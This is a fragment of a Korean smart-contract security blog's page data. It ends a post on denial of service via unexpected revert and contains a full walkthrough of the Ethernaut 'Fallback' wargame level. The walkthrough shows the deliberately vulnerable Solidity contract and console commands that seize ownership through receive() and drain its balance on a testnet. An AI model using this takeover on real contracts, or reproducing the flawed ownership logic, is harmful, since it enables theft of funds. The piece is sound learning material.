가져올 수 있다<span class=\"token punctuation\">.</span>\n</code></pre></div>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>취약점들에 대해서 공부하면서 나는 EVM에 대해서 알아가야 할 부분이 많다는 생각이 든다. <del>잘안다고 생각했는데ㅋㅋ</del> 갈 길이 멀다!! 꾸준히 공부하자:)</p>\n<hr>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert\">https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/denial-of-service/\">https://solidity-by-example.org/hacks/denial-of-service/</a></li>\n<li><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls\">https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls</a></li>\n<li><a href=\"https://arxiv.org/pdf/2105.02852.pdf\">https://arxiv.org/pdf/2105.02852.pdf</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#unexpected-revert%EB%9E%80\">Unexpected Revert란?</a></p>\n</li>\n<li>\n<p><a href=\"#example-code\">Example code</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n<ul>\n<li>\n<ul>\n<li><a href=\"#pull-over-push\"><strong>pull over push</strong></a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 29, 2021","title":"(취약점 시리즈 6) DOS With Unexpected Revert","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/"}},"prev":{"id":"650ebf86-b5f5-56e0-8802-3f609ad7e83c","html":"<h1 id=\"-1-fallback\" style=\"position:relative;\"><a href=\"#-1-fallback\" aria-label=\" 1 fallback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. Fallback</h1>\n<p><strong>Difficulty 1/10</strong></p>\n<p>직접 푼 Ethernauts 풀이를 적어보려고 한다. 취약점에 공부했던 취약점을 실제로 공격해보며 복습 및 실습을 해볼수 있어 좋은 것 같다.</p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>contract의 ownership을 뺐어오기</li>\n<li>contract의 balance를 0으로 만들기</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallback</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 각각의 address당 ether 기여도(contribution)</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> contributions<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Fallback Contract의 owner address</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//constructor</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Deployer를 owner로 설정</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Deployer의 기여도를 1000 ether로 설정</span>\n        contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//Owner만 사용할 수 있게하는 modifier</span>\n    <span class=\"token keyword\">modifier</span> onlyOwner <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// msg.sender가 owner인지 아닌지 확인</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n                msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"caller is not the owner\"</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//contract의 기여도를 올릴 수 있는 function이다.</span>\n    <span class=\"token comment\">//payable로 선언되어 ether를 전송하고 받을 수 있다.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">contribute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//msg.sender가 보낸 ether의 양이 0.001 이하인지 확인</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//msg.sender의 기여도(contributions)를 msg.value만큼 올린다.</span>\n        contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//만약 msg.sender의 contributions가 owner의 contributions보다 크다면 ownership이 transfer된다.</span>\n        <span class=\"token comment\">//초기에 owner의 contributions은 1000 ether이기 때문에 ownership을 바꾸기 위해서는 1000 ether이상의 기여해야한다.</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> contributions<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//기여도를 확인할 수 있는 view function</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//msg.sender의 기여도를 return 한다.</span>\n        <span class=\"token keyword\">return</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//contract가 가지고 있는 모든 balance(ether)를 owner에게 전송한다.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//payable로 선언되어 ether를 전송하고 받을 수 있다.</span>\n    <span class=\"token comment\">//receive function</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//msg.sender의 msg.value가 0보다 크고 기여도(contributions)가 0보다 큰지 확인한다</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//owner를 msg.sender로 바꾼다.</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>우리는 2가지의 문제를 풀어야 한다.</p>\n<ol>\n<li>contract의 ownership을 뺐어오기</li>\n<li>contract의 balance를 0으로 만들기</li>\n</ol>\n<p>차례차례 풀어보겠다.\n코드를 봤을 떄 contract의 ownership을 가져올 수 있는 방법은 2가지가 있다.</p>\n<ul>\n<li>contribute()</li>\n<li>receive()</li>\n</ul>\n<ol>\n<li>contribute()를 이용해 owner가 되려면 초기 owner의 contributions 1000 ether보다 더 큰 돈을 contract로 보내야 한다.</li>\n<li>하지만 contribute()의 require을 보면 한번에 0.001 ether이하의 ether만 보낼 수 있게 되어있다. contract에서 의도한대로 owner가 되려면 <strong>1,000,000 + a</strong> 번 전송해야한다.</li>\n<li>이 방법은 비용도 많이들고 엄청난 시간이 걸리기 때문에 receive 함수를 확인해보자!</li>\n<li>receive 함수를 보면 msg.value나 0보다 크고 contributions가 0보다 크면 owner를 msg.sender로 바꿀 수 있다.</li>\n<li>그렇다면 contribute() 호출해 작은 값을 보내어 contributions를 0을 초과하게 만든다음 receive함수를 호출하면 owner를 가져올 수 있다.</li>\n</ol>\n<p>모든 코드는 console창에서 이루어진다.\nctrl + shift + i를 눌러 console창을 활성화 시키자</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//0.001보다 작은 0.0001을 보낸다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span>contribute<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//나의 contribution을 확인한다.</span>\n<span class=\"token function\">fromWei</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//contract의 balance를 확인한다.</span>\n<span class=\"token keyword\">await</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//모두 0.0001과 같을 것이다!</span>\n\n<span class=\"token comment\">//나의 contribution이 0을 초과했으니 recevice()를 실행 시킬 수 있는 명령어를 실행한다.</span>\ncontract<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//contract의 owner address를 확인한다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//나의 address를 확인한다.</span>\nplayer\n<span class=\"token comment\">//play(나)이 owner가 된 것을 확인 할 수 있다.</span>\n</code></pre></div>\n<p>이렇게 ownership을 가져올 수 있었다.</p>\n<p>다음으로 contract의 balance를 0으로 만들기이다.\ncontract의 balance를 0을로 만들기는 매우 쉽다!\nowner만 call할 수 있는 함수인 withdraw을 call하기만 하면 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//withdraw한다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">//contract의 balance가 0이 된것을 확인한다.</span>\n<span class=\"token keyword\">await</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span></code></pre></div>\n<p>Submit instance를 누르고 조금 기다리면 block이 mine되고, 다음과 같이 뜨면서 다음 level로 넘어갈 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABJ0AAASdAHeZh94AAACfklEQVQ4y1WTiY7jNhBE/f/fFSBAkGMm4x2P14csWfdFirRknf0CUd5kI6BR7KJUeA1Su9Oh4nRQ3L2GKDD4l4bLUbkKfYN31jS6Z32WRZwWpsfLH9yKB5fUOq0fA9M0sbvdevxg4B4ORPGAf++5XHuuXk+UDPhBj7EzICzL4rQ0Pdf8gVc8XHBQtpS2Z5pGdn/uhb++Cfuj8HUR3g/Cb+8Lv38Ih7Pw9imUSl6BG2FYdbz7mo9A8+YrvoUNsXpuhOcUThmENcQKggq8Aq7F5t1KaLr/B64097LlXrWOcF3rdtgIL2bAsyM3O3F/TFztyLEZOZnx396MC8h/gXnz5HtiOKeWU2q5Zpa86TfCTwk4SMh3ibhKylEiPsRnLz4XSfmSkFrsCsgiiwuM686N+Rk17O+aY2zI9GvkTG7k4pGLTyUxpdzJ5UYiZ6drryShE8MLkMr27iDWkdcTXlX9GFnPH5j5gJn/Rs9v2PmImv+gmn+lnH7Bznv0/I6Zj8jcrJeHVD8d3VdsOESGU2Kc5wgZLzD5MH7B5CFT+OqPMJ0R59+ct0weSEFlOvyidZSOsGxRP+6h9BXS12yqtvXQvPoKaWNkWD3tir5At08i1ROrjqjuSPQT3Y6vQBUjOkZUuGkVILbYtPKR/IwUHqITt4+OsXlCqVuqx+D+msoOtP38CmwKxFSIyhBbI02JdHbzTL3VuvfqeSi6KqepFcZ2NN2I6Ub6acFay050sYWsutZPH0u1UuVIESHlOkUOVtFkKfHlSpKUbtz1ypjnRNM07CRNkSxH4gRJUiTNkCxDqgoJIyTPkSBAgjvruxQFY5rz9AKepaIbJp7DzLSIC/wHAO0qYjzyzD0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"fallback finish\"\n        title=\"fallback finish\"\n        src=\"/static/68592aa21598d925b557a56b988fc3bf/37523/fallback_finish.png\"\n        srcset=\"/static/68592aa21598d925b557a56b988fc3bf/e9ff0/fallback_finish.png 180w,\n/static/68592aa21598d925b557a56b988fc3bf/f21e7/fallback_finish.png 360w,\n/static/68592aa21598d925b557a56b988fc3bf/37523/fallback_finish.png 720w,\n/static/68592aa21598d925b557a56b988fc3bf/4b446/fallback_finish.png 877w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>얼마전에 공부했던 king of Ether(DOS with unexpected revert)가 생각난다. revert를 통해 하는 ownership을 가져오는건 아니었지만 비슷한 점이 많은 것 같았다. smart contract을 짤때 logic은 괜찮아보여도 우리가 생각하지 못한 허점이 있을 수 있다! 항상 조심하고 또 조심하자!\n나중에는 보안감사(auditing)도 배워 내의 smart contract를 audit 할 수 있었으면 좋겠다! <del>이거로 취업 해야지ㅎ</del></p>\n<p>고작 1단계를 완료한 것이지만 게임을 통해 배우니 더 재밌는 것 같다. 앞으로도 화이팅!</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 02, 2022","title":"(Ethernaut 취약점 1) Fallback","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/","nextSlug":"/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/","prevSlug":"/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}